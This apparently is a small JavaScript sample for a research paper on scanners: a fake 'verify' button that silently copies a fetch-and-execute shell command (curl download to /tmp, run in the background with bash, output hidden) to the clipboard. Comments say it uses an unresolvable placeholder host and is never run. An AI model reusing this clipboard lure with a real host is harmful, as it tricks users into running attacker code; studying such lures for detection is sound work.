// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// example.invalid cannot resolve, and the scanner never runs this file.
// Change: the command is copied through a hidden textarea and document.execCommand('copy').
function copyCommand(origin, nonce) {
  const area = document.createElement('textarea');
  area.value = `nohup bash -c "curl -ks ${origin}/demo -o /tmp/demo && bash /tmp/demo" >/dev/null 2>&1 & # Verification ID ${nonce}`;
  document.body.appendChild(area); area.select(); document.execCommand('copy'); area.remove();
}
document.querySelector('#verify').addEventListener('click', () => copyCommand('https://example.invalid', 'VERIFY-0000'));
